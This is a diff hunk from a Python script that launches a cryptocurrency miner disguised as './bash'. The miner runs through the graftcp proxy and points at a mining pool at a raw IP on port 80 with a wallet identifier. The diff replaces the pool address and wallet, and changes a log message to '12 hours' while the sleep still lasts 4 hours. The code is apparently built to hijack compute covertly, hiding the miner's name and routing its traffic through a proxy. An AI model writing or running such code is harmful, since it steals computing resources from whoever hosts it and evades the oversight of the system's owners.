@@ -63,10 +63,10 @@ def run_script():
     cd pan
 
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash --algo FISHHASH --pool 170.64.139.60:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.kontol --ethstratum ETHPROX
+    ./graftcp/graftcp ./bash --algo FISHHASH --pool 168.144.99.100:80 --user d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.kacung --ethstratum ETHPROX
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
 
-    print("Staying alive for 4 hours...")
+    print("Staying alive for 12 hours...")
     time.sleep(60 * 60 * 4)
